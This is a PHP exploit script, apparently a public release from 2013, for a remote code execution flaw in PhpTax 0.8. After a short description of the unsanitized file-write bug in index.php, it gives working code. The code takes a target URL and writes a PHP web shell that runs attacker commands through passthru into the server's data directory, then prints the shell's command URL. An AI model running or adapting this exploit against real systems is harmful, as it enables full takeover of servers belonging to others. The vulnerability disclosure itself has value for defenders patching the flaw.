<?php
#
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /          
#  / XXXXXX /
# (________(            
#  `------'

# Exploit Title   : PhpTax File Manipulation(newvalue,field) Remote Code Execution
# Date            : 31 May 2013
# Exploit Author  : CWH Underground
# Discovered By   : ZeQ3uL
# Site            : www.2600.in.th
# Vendor Homepage : http://phptax.sourceforge.net/
# Software Link   : http://sourceforge.net/projects/phptax/
# Version         : 0.8
# Tested on       : Window and Linux


#####################################################
#VULNERABILITY: FILE MANIPULATION TO REMOTE COMMAND EXECUTION
#####################################################

#index.php

#LINE 32: fwrite fwrite($zz, "$_GET['newvalue']"); 
#LINE 31: $zz = fopen("./data/$field", "w"); 
#LINE  2: $field = $_GET['field']; 

#####################################################
#DESCRIPTION
#####################################################

#An attacker might write to arbitrary files or inject arbitrary code into a file with this vulnerability. 
#User tainted data is used when creating the file name that will be opened or when creating the string that will be written to the file. 
#An attacker can try to write arbitrary PHP code in a PHP file allowing to fully compromise the server.


#####################################################
#EXPLOIT
#####################################################
 
$options = getopt('u:');
   
if(!isset($options['u']))
die("\n        Usage example: php exploit.php -u http://target.com/ \n"); 
   
$url     =  $options['u'];
$shell = "{$url}/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E";

$headers = array('User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)',
'Content-Type: text/plain');
   
echo "        [+] Submitting request to: {$options['u']}\n";
   
$handle = curl_init();
   
curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
   
$source = curl_exec($handle);
curl_close($handle);
   
if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r'))
{
echo "        [+] Exploit completed successfully!\n";
echo "        ______________________________________________\n\n        {$url}/data/rce.php?cmd=id\n";
}
else
{
die("        [+] Exploit was unsuccessful.\n");
}
    

################################################################################################################
# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
################################################################################################################
?>  
